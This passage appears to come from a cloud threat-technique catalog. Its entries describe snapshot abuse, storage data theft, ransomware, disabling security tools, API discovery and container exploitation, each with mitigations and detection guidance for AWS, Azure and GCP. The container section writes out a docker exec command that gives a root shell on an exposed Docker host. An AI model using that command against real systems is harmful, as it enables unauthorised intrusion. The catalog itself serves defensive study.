Permissions to create snapshots of VM’s differ from permissions for accessing VM ephemeral storage or permissions or for accessing storage locations of backups. Even It is plausible that an adversary could create a snapshot of a VM in a directory he controls or have permissions to read a storage location where snapshots are stored and then restore the image. An adversary This could allow the adversary to gain access to any data stored within the ephemeral storage of the VM without explicit permissions.


Examples




| **Name** | **Description** |
| --- | --- |
|  |  |


Mitigations




| **Mitigation** | **Description** |
| --- | --- |
| Ensure permissions for snapshots are managed adequately | In Azure the VM Contributor role has the right to create snapshot and a storage reader can access existing snapshots already created. |


Detection


Closely monitor API access to storage accounts associated with backups.



References


1. https://docs.microsoft.com/en-us/azure/backup/backup-rbac-rs-vault -Accessed June 17,2020


# Data Collected from Cloud Storage Object (combined with S3/Blob manipulation)(version 1.0)


**Cloud Service Label: IaaS**


Description


Adversaries may access data objects from improperly secured cloud storage.


Many cloud service providers offer solutions for online data storage such as Amazon S3, Azure Storage, and Google Cloud Storage. These solutions differ from other storage solutions (such as SQL or Elasticsearch) in that there is no overarching application. Data from these solutions can be retrieved directly using the cloud provider's APIs. Solution providers typically offer security guides to help end users configure systems.


Misconfiguration by end users is a common problem. There have been numerous incidents where cloud storage has been improperly secured (typically by unintentionally allowing public access by unauthenticated users or overly-broad access by all users), allowing open access to credit cards, personally identifiable information, medical records, and other sensitive information. Adversaries may also obtain leaked credentials in source repositories, logs, or other means as a way to gain access to cloud storage objects that have access permission controls.


Examples




| **Name** | **Description** |
| --- | --- |
| S3\_download\_Bucket | Publicly available Pacu module that scans the current account for AWS buckets and prints/stores as much data as it can about each one. With no arguments, this module will enumerate all buckets the account has access to, then prompt you to download all files in the bucket or not. |


Mitigations




| **Mitigation** | | **Description** |
| --- | --- | --- |
| [Audit](https://attack.mitre.org/mitigations/M1047) | | Frequently check permissions on cloud storage to ensure proper permissions are set to deny open or unprivileged access to resources. Consider using automated resource checkers such as CloudSploit or Divvycloud. |
|  | AWS | To perform an audit via AWS it is suggested to review information such as account details (credentials, users, groups, roles, etc), mobile applications, EC2 configurations, policies, and account activity. How to audit these different factors can be found in detail at:**https://docs.aws.amazon.com/general/latest/gr/aws-security-audit-guide.html.** |
|  | Azure | To perform an audit via Azure an administrator can review the audit logs that are recorded under Azure’s monitoring for active directory. The audit logs allow for filtering, as well as looking at users, groups, and enterprise specific information. Full details on how to access this information can be found at:**https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/concept-audit-logs.** |
|  | GCP | To perform an audit via GCP the logs can be reviewed. GCP breaks this down into three categories; admin activity, data access, and system events. The audit logs can be viewed a few different ways- the console, API, or gcloud. Full details on how to view these logs, how to export, and for how to configure the retention period can be found here:**https://cloud.google.com/logging/docs/audit.** |
| [Encrypt Sensitive Information](https://attack.mitre.org/mitigations/M1041) | | Encrypt data stored at rest in cloud storage. Managed encryption keys can be rotated by most providers. At a minimum, ensure an incident response plan to storage breach includes rotating the keys and test for impact on client applications. |
|  | AWS | To encrypt data at rest in an AWS environment first start by configuring the IAM roles and permissions. A policy will need to be created to specify that the data is to be encrypted and then the policy is attached to the instance. Full details on how to accomplish this can be found at:**https://aws.amazon.com/blogs/security/how-to-protect-data-at-rest-with-amazon-ec2-instance-store-encryption/**. |
|  | Azure | To encrypt data at rest in an Azure environment it can be done differently depending on the cloud service the customer is utilizing. For SaaS customers this can be enabled or available on each specific service. For PaaS customers there are specific storage and application platforms that can be used. In terms of IaaS customers this can be broken down to a couple different aspects. Encrypted storage can be enabled the same as PaaS services, utilizing other Azure services. Encrypted compute allows for all managed disks, snapshots, and images to be encrypted utilizing a service managed key. The keys are stored in the Azure key vault. Full details on how to accomplish this can be found at:[**https://docs.microsoft.com/en-us/azure/security/fundamentals/encryption-atrest**](https://docs.microsoft.com/en-us/azure/security/fundamentals/encryption-atrest)**.** |
| [Filter Network Traffic](https://attack.mitre.org/mitigations/M1037) | | Cloud service providers support IP-based restrictions when accessing cloud resources. Consider using IP whitelisting along with user account management to ensure that data access is restricted not only to valid users, but only from expected IP ranges to mitigate the use of stolen credentials to access data. |
|  | AWS | An AWS environment can be configured with network ACLs (access control lists) to allow or deny inbound and outbound traffic. This can be accomplished by accessing Amazon VPC and navigating to either inbound or outbound rules depending on the rule the user wishes to add and they can be added, removed, or edited from that panel. Full details about ACLs and how to add rules in AWS can be found here:**https://docs.aws.amazon.com/vpc/latest/userguide/vpc-network-acls.html.** |
|  | Azure | In Azure storage resources can be tied exclusively to a particular virtual network reducing the chances that it can be accessed externally or from other cloud assets. This can be done multiple ways including the Azure Portal, Azure PowerShell, and Azure CLI (Command Line Interface). Depending on the method used to implement this the procedure can vary, but will include the need to create a security group, create a network security group, associate that network security group with a specific subnet and then create security rules that are associated to the inbound and outbound rules for that subnet. Full details on how to configure this utilizing the various methods can be found below: Azure Portal:**https://docs.microsoft.com/en-us/azure/virtual-network/tutorial-filter-network-traffic** Azure PowerShell:**https://docs.microsoft.com/en-us/azure/virtual-network/tutorial-filter-network-traffic-powershell** Azure CLI:**https://docs.microsoft.com/en-us/azure/virtual-network/tutorial-filter-network-traffic-cli** |
| [Multi-factor Authentication](https://attack.mitre.org/mitigations/M1032) | | Use multi-factor authentication for user and privileged accounts. Do not manage Cloud portals from machines that perform user email and web browsing tasks. All users should be required to utilize two factor authentication. |
|  | *AWS* | This can be enforced by first creating a policy that would prohibit actions except those that allow a user to change their password or manage 2FA, then attaching a policy to a group that includes all user accounts where they can be allowed all access if they sign in with 2FA. Once these actions are completed it should be tested to verify the access is given correctly. To see full details on how to complete this view AWS documentation at:**https://docs.aws.amazon.com/IAM/latest/UserGuide/tutorial\_users-self-manage-mfa-and-creds.html.** |
|  | *Azure* | This can be done by creating a MFA registration policy. It can than be assigned to all users (with the ability to exclude some if need be, but is not recommended). Make sure once the policy is created and added to users that it is then being enforced, once enforced it should be tested for verification. To see full details on how to complete this view Azure documentation at:**https://docs.microsoft.com/en-us/azure/active-directory/identity-protection/howto-identity-protection-configure-mfa-policy.** |
|  | *GCP* | This can be done by first enabling it on the current account being used by admin to assign the roles, then enable two factor on an instance by instance or project by project basis, then assigning the requirements based on IAM roles and applying it to all users. To see full details on how to complete this view Azure documentation at:**https://cloud.google.com/compute/docs/oslogin/setup-two-factor-authentication.** |
| [Restrict File and Directory Permissions](https://attack.mitre.org/mitigations/M1022) | | Users should have limited access to files and directories depending on their need for access. The file and directory permissions should be restricted on the basis of least privilege. |
|  | AWS | To manage the files and directory permissions in AWS, IAM policies can be used. This can be done by utilizing group policies and policy variables. The policy would be created specifying the folder, then the permissions attached to that folder (whether the user has access to list out the objects within the directory, if they have read permissions, if they have write permissions, etc.), lastly the group that it applies to would be specified. The users can that be added and removed from that group as needed. Full details on how this can be done is explained here:**https://aws.amazon.com/blogs/security/writing-iam-policies-grant-access-to-user-specific-folders-in-an-amazon-s3-bucket/.** |
|  | Azure | To manage the files and directory permissions in an Azure environment basic and advanced system defined controls. This will be dependent on the type of system being used (Windows, Linux, etc). The permissions will be set individually or by group using the system commands or controls needed.. Full details on how this can be done is explained here:[**https://docs.microsoft.com/en-us/azure/storage/files/storage-files-identity-ad-ds-configure-permissions**](https://docs.microsoft.com/en-us/azure/storage/files/storage-files-identity-ad-ds-configure-permissions)**.** |


Detection


Monitor for unusual queries to the cloud provider's storage service. Activity originating from unexpected sources may indicate improper permissions are set that is allowing access to data. Additionally, detecting failed attempts by a user for a certain object, followed by access to the same object may be an indication of suspicious activity.


References


1.[Amazon. (2019, May 17). How can I secure the files in my Amazon S3 bucket?. Retrieved October 4, 2019.](https://aws.amazon.com/premiumsupport/knowledge-center/secure-s3-resources/)


2.[Amlekar, M., Brooks, C., Claman, L., et. al.. (2019, March 20). Azure Storage security guide. Retrieved October 4, 2019.](https://docs.microsoft.com/en-us/azure/storage/common/storage-security-guide)


3.[Google. (2019, September 16). Best practices for Cloud Storage. Retrieved October 4, 2019.](https://cloud.google.com/storage/docs/best-practices)


4.[Trend Micro. (2017, November 6). A Misconfigured Amazon S3 Exposed Almost 50 Thousand PII in Australia. Retrieved October 4, 2019.](https://www.trendmicro.com/vinfo/us/security/news/virtualization-and-cloud/a-misconfigured-amazon-s3-exposed-almost-50-thousand-pii-in-australia)


5.[Barrett, B.. (2019, July 11). Hack Brief: A Card-Skimming Hacker Group Hit 17K Domains—and Counting. Retrieved October 4, 2019.](https://www.wired.com/story/magecart-amazon-cloud-hacks/)


6.[HIPAA Journal. (2017, October 11). 47GB of Medical Records and Test Results Found in Unsecured Amazon S3 Bucket. Retrieved October 4, 2019.](https://www.hipaajournal.com/47gb-medical-records-unsecured-amazon-s3-bucket/)


7.[Amazon. (n.d.). Temporary Security Credentials. Retrieved October 18, 2019.](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp.html)


8.[Google. (n.d.). Key rotation. Retrieved October 18, 2019.](https://cloud.google.com/kms/docs/key-rotation)


# Data from VM Local File System(version 1.0)


**Cloud Service Label: IaaS**


**Description**


Sensitive data can be collected from VM local (ephemeral) file systems or resident databases residing on the system prior to Exfiltration.


Adversaries will often search the file system on computers they have compromised to find files of interest. They may do this using a[Command-Line Interface](https://attack.mitre.org/techniques/T1059), such as cmd, which has functionality to interact with the file system to gather information. Some adversaries may also use[Automated Collection](https://attack.mitre.org/techniques/T1119)on the local system.


Examples




| **Name** | **Description** |
| --- | --- |
|  |  |


Mitigations




| **Mitigation** | **Description** |
| --- | --- |
|  | This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features. |


Detection


Monitor processes and command-line arguments for actions that could be taken to collect files from a system. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as[Windows ManagementInstrumentation](https://attack.mitre.org/techniques/T1047)and[PowerShell](https://attack.mitre.org/techniques/T1086).


Reference


# Denial of Data(version 1.1)


**Cloud Service Label: IaaS, PaaS, SaaS**


Description


*Destruction*


Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives. Common operating system file deletion commands such asdelandrmoften only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from[Disk Content Wipe](https://attack.mitre.org/techniques/T1488)and[Disk Structure Wipe](https://attack.mitre.org/techniques/T1487)because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.


Adversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable. In some cases politically oriented image files have been used to overwrite data.


To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like[Valid Accounts](https://attack.mitre.org/techniques/T1078),[Credential Dumping](https://attack.mitre.org/techniques/T1003), and[Windows Admin Shares](https://attack.mitre.org/techniques/T1077).


*Encrypted for Impact*


Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote stores and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted. In the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.


To maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like[Valid Accounts](https://attack.mitre.org/techniques/T1078),[Credential Dumping](https://attack.mitre.org/techniques/T1003), and[Windows Admin Shares](https://attack.mitre.org/techniques/T1077).


Examples




| **Name** | **Description** |
| --- | --- |
| Ransomware | Attackers with access to a company’s cloud can encrypt or take data and attempt to ransoms it back to the company. |
| Deleting cloud backups | Before releasing Ransomware onto a company’s environment, attackers have been known to delete backups. Thereby making downtime even longer due to organizations not being able to revert to a backup state quickly. |


Mitigations




| **Mitigation** | | **Description** |
| --- | --- | --- |
| Data Backup | | Consider implementing IT disaster recovery plans that contain procedures for regularly taking and testing data backups that can be used to restore organizational data. In Azure, data backups can be restored from several points in time if corruption makes its way into an automated backup. The Azure Backup service has built in heuristics to detect potentially suspicious activity regarding Backup service commands. Also note that backups stored in different physical locations also mitigates risk against data loss. |
|  | *AWS* | To have a data backup in an AWS environment, AWS Backup can be used. This is a way to centralize and automate backup services, as well as enforce backup policies that might include aspects such as encryption requirements and audit the activity on the backup. The backup service is PCI and ISO compliant and is HIPAA eligible. There are different backups available: cloud-native (across all AWS services) and hybrid (across AWS and on premise data). To accomplish this a backup plan needs to be created that defines criteria on how to manage the backups (ie. how frequently to backup, how long to keep the backups, etc.), then the resources to backup are assigned. Once the resources are backed up they can be minored, modified, or restored. To get started with this information can be found here:[**https://aws.amazon.com/backup/getting-started/**](https://aws.amazon.com/backup/getting-started/)**.**For more information on the service refer here:[**https://aws.amazon.com/backup/**](https://aws.amazon.com/backup/)**.**Access to and introduction video can be found here:[**https://www.aws.training/Details/Video?id=29646**](https://www.aws.training/Details/Video?id=29646)**.** |
|  | *Azure* | To have a data backup in an Azure environment, Azure Backup service can be used. This allows for on-premises, Azure VMs, Azure file shares, SQL server in Azure VMs, and SAP HANA databases in Azure VMs to be backed up. There are multiple ways this can be accomplished; through the portal, PowerShell, CLI, and ARM template. From the portal a VM to be backed up can be selected, then enable to backup resource, start the backup job, monitor the backup job, and when you no longer need the deployment it can then be cleared up. Using PowerShell and CLI has the same steps (just accomplished through different commands) first a recovery service vault will be created, then the backup will need to be enabled for the service being backed up, then the backup job will need to be started, then monitored, and lastly clean up the deployment. Lastly, to deploy with the ARM template first the template has to be reviewed and edited as needed, then deploy the template, then the deployment must be validated by starting a backup job, monitoring it, and cleaning up the resources. On this page multiple tutorials can be found for backing up specific resources:[**https://docs.microsoft.com/en-us/azure/backup/tutorial-backup-vm-at-scale**](https://docs.microsoft.com/en-us/azure/backup/tutorial-backup-vm-at-scale). Full details on how to deploy backup services utilizing different resources can be found below: Portal:[**https://docs.microsoft.com/en-us/azure/backup/quick-backup-vm-portal**](https://docs.microsoft.com/en-us/azure/backup/quick-backup-vm-portal) PowerShell:[**https://docs.microsoft.com/en-us/azure/backup/quick-backup-vm-powershell**](https://docs.microsoft.com/en-us/azure/backup/quick-backup-vm-powershell) CLI:[**https://docs.microsoft.com/en-us/azure/backup/quick-backup-vm-cli**](https://docs.microsoft.com/en-us/azure/backup/quick-backup-vm-cli) ARM Template:[**https://docs.microsoft.com/en-us/azure/backup/quick-backup-vm-template**](https://docs.microsoft.com/en-us/azure/backup/quick-backup-vm-template) |


Detection


Use process monitoring to monitor the execution and command line parameters of binaries involved in data destruction activity, such as vssadmin, wbadmin, and bcdedit. Monitor for the creation of suspicious files as well as unusual file modification activity. In particular, look for large quantities of file modifications in user directories. In some cases, monitoring for unusual kernel driver installation activity can aid in detection. In Azure, monitoring for rest commands sent to the Azure API such as:


Delete https://myaccount.file.core.windows.net/myshare/myparentdirectorypath/mydirectory?restype=directory


This can indicate an attempt to delete multiple files. One place this can be observed is in Azure thru the Activity log blade within the Monitor service.


References


1.<https://www.bleepingcomputer.com/news/security/ransomware-attackers-use-your-cloud-backups-against-you/>- Accessed 8/13/21


2.


# Deprecated Cloud API’s(version 1.0)


**Cloud Service Label: IaaS, PaaS**


Description


Cloud Service Providers (CSPs) are constantly adding services and updating their APIs. This situation creates a fair amount of deprecation within the CSP environment. To maintain backwards capability, many of these deprecated API’s still work even after they are no longer officially documented and maintained. Both Azure and GCP as newer more dynamic clouds are especially prone to this phenomenon. Deprecated APIs are likely not to be well integrated with new security logging mechanisms and controls. This offers an adversary who does some research a potential method of interacting with cloud services in a manner that may not be observed or prevented by otherwise strong controls.


Examples




| **Name** | **Description** |
| --- | --- |
| Azure Classic | Previous Console and API suite for managing Azure resources 2017 and prior. |


Mitigations




| **Mitigation** | **Description** |
| --- | --- |
| Manage log data like other sensitive data | Ensure log data is protected and managed like any other confidential data source with encryption at rest and positive control. |


Detection


Difficult to detect gaps in deprecated API’s.


References


1.https://docs.microsoft.com/en-us/azure/azure-resource-manager/management/deployment-models, - Accessed March 5, 2020


# Disable or Modify Security Tools(version 1.0)


**Cloud Service Label: IaaS, PaaS**


Description


Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security tools scanning or reporting information.


Cloud Workload Protection Platforms (CWPPs) are cloud security solutions that reduce the impact of malware intrusion in public cloud infrastructure. Companies like Trend Micro, Symantec, and Microsoft have their own cloud security products (Trend Micro Deep Security, Symantec Cloud Workload Protection, and Azure Security Center respectively).


Examples




| **Name** | **Description** |
| --- | --- |
| Rocke Group Malware | Rocke Group Malware uninstalled cloud security products from vendors Alibaba Cloud and Tencent Cloud. It would begin the process by killing the monitoring and other agent-based processes, then utilizing public documentation and*wget*to pull down and run uninstall scripts for the cloud security products. |
|  |  |
|  |  |


Mitigations




| **Mitigation** | | **Description** |
| --- | --- | --- |
| Restrict File and Directory Permissions | | Users should have limited access to files and directories depending on their need for access. The file and directory permissions should be restricted on the basis of least privilege.Ensure proper process and file permissions are in place to prevent adversaries from disabling or interfering with security/logging services. |
|  | *AWS* | To manage the files and directory permissions in AWS, IAM policies can be used. This can be done by utilizing group policies and policy variables. The policy would be created specifying the folder, then the permissions attached to that folder (whether the user has access to list out the objects within the directory, if they have read permissions, if they have write permissions, etc.), lastly the group that it applies to would be specified. The users can that be added and removed from that group as needed. Full details on how this can be done is explained here:**https://aws.amazon.com/blogs/security/writing-iam-policies-grant-access-to-user-specific-folders-in-an-amazon-s3-bucket/.** |
|  | *Azure* | To manage the files and directory permissions in an Azure environment basic and advanced system defined controls. This will be dependent on the type of system being used (Windows, Linux, etc). The permissions will be set individually or by group using the system commands or controls needed.. Full details on how this can be done is explained here:**https://docs.microsoft.com/en-us/azure/storage/files/storage-files-identity-ad-ds-configure-permissions.** |
| Least Privilege | | All access given to users in the cloud environment should be assigned by the necessary privileges needed for team members to complete their job responsibilities.Ensure that temporary access tokens are issued rather than permanent credentials, especially when access is being granted to entities outside of the internal security boundary .Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security/logging services. |
|  | *AWS* | To implement least privilege in an AWS environment IAM policies will be used. This gives the ability to allow users to perform list, read, write, permissions management, or tagging actions. AWS suggests utilizing*last accessed information*and A*WS CloudTrail event history*to get a better understanding of privileges that might be needed or reduced based on a specific role. Full details can be found at**https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege.** |
|  | *Azure* | To implement least privilege in an Azure environment Azure Active Directory roles will be used. Azure outlines different tasks and the least privileged role that are suggested to be associated with the task. Those details can be found at:**https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/roles-delegate-by-task.**To learn how to assign specific roles it can be done via the Azure Active Directory Portal. Instructions on how to assign roles can be found here:**https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-manage-roles-portal.** |
|  | *GCP* | To implement least privilege in GCP it is recommended to use predefined roles (which allow for granular access permissions) instead of primitive roles (roles/owner, roles/editor, and roles/viewer). Full details on the difference between types of roles can be found here:**https://cloud.google.com/iam/docs/understanding-roles.**To assign these roles IAM service accounts are used and complete details can be found at:**https://cloud.google.com/iam/docs/using-iam-securely#least\_privilege.** |


Detection




| **Detection** | **Description** |
| --- | --- |
| Create Log Metric Filters and Alarms for AWS | To create a metric filter and alarm: 1.Create a metric filter that checks for IAM policy changes and the*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter and SNS topic created in steps 1 and 2 respectively |
| Monitor Activity in AWS Account | Various services in AWS offer logging features that allow for detection capabilities. These include CloudFront, CloudTrail, CloudWatch, Config, and S3. |
| Monitor for Suspicious Activity in Azure | Azure AD can generate anomaly reports than can be run on a daily basis. Azure AD Identity Protection show current risks in its dashboard and provides daily email summary notifications. Policies can also be configured to alert to specific issues. |
| Create Log Metric Filters and Alarms for CloudTrail | To create a metric filter and alarm: 1.Create a filter that checks for CloudTrail changes and the specific*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic that the alarm will notify 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter from step 1 and SNS topic in step 2 |
| Create Activity Log Alerts in Azure | To create log activity alerts for deletion in the Azure Console: 1.Navigate to*Monitor’ / ‘Alerts* 2.Select*Manage alert rules* 3.Click on the Alert*Name*where Condition contains*operationName equals Microsoft.Network/networkSecurityGroups/securityRules/delete* 4.Hover a mouse over*Condition*to ensure it is set to*Whenever the Administrative Activity Log “Delete Security Rule (networkSecurityGroups/securityRules)” has “any” level with “any” status and event is initiated by “any*” |
| Create, View, and Manage Activity Alerts in Azure Monitor | To create a log alert in the Azure portal: 1.Select**Monitor -> Alerts** 2.Select**New alert rule**of the**Alerts**window 3.Provide information in**Define alert condition** 4.Provide details in**Define alert details** 5.Specify action group for new alert rule under**Action group**, or create a new action group with +**New group** 6.Select**Yes**for the**Enable rule upon creation**option 7.Select**Create alert rule** To view and manage alerts: 1.Select**Monitor -> Alerts -> Manage alert rules** 2.Select the rule you want to modify and double-click to edit the rule options 3.Click**Save** |
| Azure Resource Manager Templates | Azure Resource Manager templates in the format of JSON files that can be used to configure metric alerts in Azure Monitor. These templates can be used for simple static and dynamic threshold metric alerts, availability tests, and monitoring multiple resources. |
| Enable CloudTrail across all regions in AWS | To enable CloudTrail across all regions: 1.Sign into the AWS Management Console and open the CloudTrail console 2.Click on*Trails* 3.Set necessary Trails to All option in the I column 4.Click on a trail via the link*Name*column 5.Set*Logging*to*ON* 6.Set*Apply trail to all regions*to*Yes* |
| Configure log profile to capture activity logs for all regions in Azure | To set up activity logs for all regions: 1.Navigate to Azure console 2.Go to*Activity log* 3.Select*Export* 4.Select*Subscription* 5.Check*Select all*in*Regions* 6.Select*Save* |


References


1.<https://unit42.paloaltonetworks.com/malware-used-by-rocke-group-evolves-to-evade-detection-by-cloud-security-products/>.Accessed July 14, 2020.


# Discovery Using Cloud APIs(version 1.1)


**Cloud Service Label:**


Description


An adversary may attempt to enumerate the cloud services running on a system after gaining access via credentials or by using publicly accessible API’s to brute force access to cloud resources. Many different services exist throughout the various cloud providers and can include continuous integration and continuous delivery (CI/CD), Lambda Functions, Azure AD, storage etc. Adversaries may attempt to discover information about the services enabled throughout the environment.


Examples




| **Name** | **Description** |
| --- | --- |
| Pacu | Pacu, an open source AWS exploitation framework, supports several methods for discovering cloud services. s3\_bucket\_finder for instance will attempt to guess S3 bucket names and scan for them in every AWS region. If configuration settings are misconfigured, an adversary can even access your S3 bucket with no additional knowledge or credentials. PACU will soon have Azure functionality according to the authors. |
| WeirdAAL | This is an open source resource to interact with AWS services. It is a compilation of discovery scripts that can be utilized by offensive and defensive security experts. |
| NimboStratus | This is an open source tool for fingerprinting and exploiting Amazon cloud infrastructures. These tools are a PoC developed using the[boto](https://github.com/boto/boto)library for accessing Amazon's API. |
| ROADtools | This is an open source framework to interact with Azure AD. There are two libraries this consists of, ROADlib and ROADrecon. ROADlib is a library that can be used to authenticate with Azure AD or to build tools that integrate with a database containing ROADrecon data. ROADrecon Uses an automatically generated metadata model to create an SQLAlchemy backed database on disk. It also uses asynchronous HTTP calls in Python to dump all available information in the Azure AD graph to this database. It gives the ability to provide plugins to query the database and output it to a useful format. |


Mitigations




| **Mitigation** | | **Description** |
| --- | --- | --- |
|  | | This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features. |
| Least Privilege | | All access given to users in the cloud environment should be assigned by the necessary privileges needed for team members to complete their job responsibilities.Ensure that temporary access tokens are issued rather than permanent credentials, especially when access is being granted to entities outside of the internal security boundary . |
|  | *AWS* | To implement least privilege in an AWS environment IAM policies will be used. This gives the ability to allow users to perform list, read, write, permissions management, or tagging actions. AWS suggests utilizing*last accessed information*and A*WS CloudTrail event history*to get a better understanding of privileges that might be needed or reduced based on a specific role. Full details can be found at**https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege.** |
|  | *Azure* | To implement least privilege in an Azure environment Azure Active Directory roles will be used. Azure outlines different tasks and the least privileged role that are suggested to be associated with the task. Those details can be found at:**https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/roles-delegate-by-task.**To learn how to assign specific roles it can be done via the Azure Active Directory Portal. Instructions on how to assign roles can be found here:**https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-manage-roles-portal.** |
|  | *GCP* | To implement least privilege in GCP it is recommended to use predefined roles (which allow for granular access permissions) instead of primitive roles (roles/owner, roles/editor, and roles/viewer). Full details on the difference between types of roles can be found here:**https://cloud.google.com/iam/docs/understanding-roles.**To assign these roles IAM service accounts are used and complete details can be found at:**https://cloud.google.com/iam/docs/using-iam-securely#least\_privilege.** |


Detection




| **Detection** | **Description** |
| --- | --- |
| Create Log Metric Filters and Alarms for AWS | To create a metric filter and alarm: 1.Create a metric filter that checks for IAM policy changes and the*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter and SNS topic created in steps 1 and 2 respectively |
| Monitor Activity in AWS Account | Various services in AWS offer logging features that allow for detection capabilities. These include CloudFront, CloudTrail, CloudWatch, Config, and S3. |
| Monitor for Suspicious Activity in Azure | Azure AD can generate anomaly reports than can be run on a daily basis. Azure AD Identity Protection show current risks in its dashboard and provides daily email summary notifications. Policies can also be configured to alert to specific issues. |
| Create Log Metric Filters and Alarms for CloudTrail | To create a metric filter and alarm: 1.Create a filter that checks for CloudTrail changes and the specific*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic that the alarm will notify 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter from step 1 and SNS topic in step 2 |
| Create Activity Log Alerts in Azure | To create log activity alerts for deletion in the Azure Console: 1.Navigate to*Monitor’ / ‘Alerts* 2.Select*Manage alert rules* 3.Click on the Alert*Name*where Condition contains*operationName equals Microsoft.Network/networkSecurityGroups/securityRules/delete* 4.Hover a mouse over*Condition*to ensure it is set to*Whenever the Administrative Activity Log “Delete Security Rule (networkSecurityGroups/securityRules)” has “any” level with “any” status and event is initiated by “any*” |
| Create, View, and Manage Activity Alerts in Azure Monitor | To create a log alert in the Azure portal: 1.Select**Monitor -> Alerts** 2.Select**New alert rule**of the**Alerts**window 3.Provide information in**Define alert condition** 4.Provide details in**Define alert details** 5.Specify action group for new alert rule under**Action group**, or create a new action group with +**New group** 6.Select**Yes**for the**Enable rule upon creation**option 7.Select**Create alert rule** To view and manage alerts: 1.Select**Monitor -> Alerts -> Manage alert rules** 2.Select the rule you want to modify and double-click to edit the rule options 3.Click**Save** |
| Azure Resource Manager Templates | Azure Resource Manager templates in the format of JSON files that can be used to configure metric alerts in Azure Monitor. These templates can be used for simple static and dynamic threshold metric alerts, availability tests, and monitoring multiple resources. |
| Enable S3 Bucket Logging | To enable CloudTrail S3 bucket logging: 1.Navigate to CloudTrail console at Go to the Amazon CloudTrail console 2.Click Trails in the API activity history pane on the left 3.Sign into AWS Management Console and open the S3 console Sign in to the AWS Management Console and open the S3 console 4.Click on a bucket under*All Buckets* 5.Click on*Properties* 6.Under*Bucket:\_<bucket\_name>\_*click*Logging* 7.Ensure*Enabled*is checked |
| Enable Azure Storage Logging | This is used to track how requests made to Azure Storage were authorized. Enabling logs provides visibility into whether a request was anonymous, made with an OAuth2.0 token, a shared key, or shared access signature (SAS). Full Azure Storage analytics logging details can be found at[**https://docs.microsoft.com/en-us/azure/storage/common/storage-analytics-logging?tabs=dotnet**](https://docs.microsoft.com/en-us/azure/storage/common/storage-analytics-logging?tabs=dotnet)**.** |
| Enable CloudTrail across all regions in AWS | To enable CloudTrail across all regions: 1.Sign into the AWS Management Console and open the CloudTrail console 2.Click on*Trails* 3.Set necessary Trails to All option in the I column 4.Click on a trail via the link*Name*column 5.Set*Logging*to*ON* 6.Set*Apply trail to all regions*to*Yes* |
| Configure log profile to capture activity logs for all regions in Azure | To set up activity logs for all regions: 1.Navigate to Azure console 2.Go to*Activity log* 3.Select*Export* 4.Select*Subscription* 5.Check*Select all*in*Regions* 6.Select*Save* |
| Monitoring for Regional Activity | Tools like Splunk or even CloudSploit have the ability to alert based on region and ingest CloudTrail logs. In CloudSploit, a plugin called EC2 Max Count can be configured to alert after a certain threshold of EC2 instances is met. Real-Time Events service is another feature of CloudSploit that allows alerts for activity in unused regions. |


References


1.[Rhino Security Labs. (2019, August 22). Pacu. Retrieved October 17, 2019.](https://github.com/RhinoSecurityLabs/pacu)


2.<https://github.com/carnal0wnage/weirdAAL/wiki/_modules_sts>. Accessed Feb 22,2020


3.<http://andresriancho.github.io/nimbostratus/>. Accessed Feb 22,2020


# Exploiting Containers(version 1.0)


**Cloud Service Label: PaaS, SaaS, IaaS**


Docker containers utilized in the cloud can be exploited by an adversary. Azure manages containers via Azure Container Services (ACS) and Amazon manages containers via Amazon Elastic Container Service (Amazon ECS). Depending on how the infrastructure is provisioned, exploiting this could provide privilege escalation, discovery, and exfiltration opportunities.


Examples




| **Name** | **Description** |
| --- | --- |
| DEF CON 27: Cloud Village Presentation | If docker.sock (which is normally open on port 2376) is exposed and you can interact with it, you can create a new container and mount the host’s filesystem (as root), run the container, and the adversary can have root privileges to the filesystem. BOtB, is an open source tool created to automate recon and exploit of containers. |
| Exposed Docker Port | Identifying an open port associated with Docker (2376 is the most common open port by default) can lead to finding running containers and images. Most containers run with default root privileges, so running*docker -H 192.168.1.7:2376 exec -it <container name> /bin/bash*will automatically give you root once logged in. |


Mitigations




| **Mitigation** | **Description** |
| --- | --- |
| Restrict Access to Specific Networks | Restricting the access that Containers have to specific networks will limit the availability of data if credentials are compromised. |
| Limit Access to Accounts | A user or process with read privileges to a registry also has the ability to list and pull any images in a registry. Make sure only those that need privileges have it. |
